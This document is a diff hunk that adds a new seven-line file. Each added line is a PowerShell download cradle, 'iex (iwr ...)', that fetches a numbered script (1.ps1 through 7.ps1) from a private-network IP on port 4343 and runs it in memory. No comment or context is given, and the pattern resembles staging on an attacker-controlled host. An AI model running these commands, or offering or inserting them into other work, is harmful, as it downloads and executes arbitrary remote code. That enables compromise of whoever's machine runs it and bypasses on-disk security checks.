@@ -1,0 +1,7 @@
+iex (iwr -UseBasicParsing http://192.168.239.128:4343/1.ps1)
+iex (iwr -UseBasicParsing http://192.168.239.128:4343/2.ps1)
+iex (iwr -UseBasicParsing http://192.168.239.128:4343/3.ps1)
+iex (iwr -UseBasicParsing http://192.168.239.128:4343/4.ps1)
+iex (iwr -UseBasicParsing http://192.168.239.128:4343/5.ps1)
+iex (iwr -UseBasicParsing http://192.168.239.128:4343/6.ps1)
+iex (iwr -UseBasicParsing http://192.168.239.128:4343/7.ps1)
